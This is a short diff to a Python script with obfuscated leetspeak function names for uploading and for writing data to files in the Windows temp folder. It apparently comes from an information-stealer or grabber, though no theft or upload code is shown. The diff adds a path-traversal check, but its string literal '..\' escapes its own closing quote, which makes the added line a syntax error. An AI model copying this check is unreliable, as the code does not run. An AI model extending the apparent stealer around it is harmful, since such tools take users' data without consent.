@@ -592,6 +592,8 @@ def UP104D(name, link):
         return
 
 def Wr173F0rF113(data, name):
+    if '../' in name or '..\' in name:
+        raise Exception('Invalid file path')
     path = os.getenv("TEMP") + f"\cs{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
         for line in data:
